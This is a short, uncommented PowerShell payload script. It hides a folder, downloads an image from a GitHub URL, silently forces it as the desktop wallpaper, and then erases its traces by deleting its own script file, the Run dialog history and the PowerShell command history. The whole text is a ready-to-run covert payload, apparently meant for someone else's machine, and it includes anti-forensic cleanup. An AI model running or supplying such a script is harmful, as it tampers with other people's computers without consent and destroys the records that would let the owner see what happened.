attrib +s +h "$env:USERPROFILE\temp"; iwr "https://raw.githubusercontent.com/Noshbit/literate-chainsaw/main/d.jpg" -outfile "$env:USERPROFILE\temp\a.jpg"; sp 'HKCU:Control Panel\Desktop' Wallpaper "$env:USERPROFILE\temp\a.jpg"; 1..59 | % {RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters -windowstyle hidden; $i; $i++};
rm "$env:userprofile\temp\1.ps1";
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue; $pshist = Get-PSReadlineOption | select -expand historysavepath; rm $pshist;
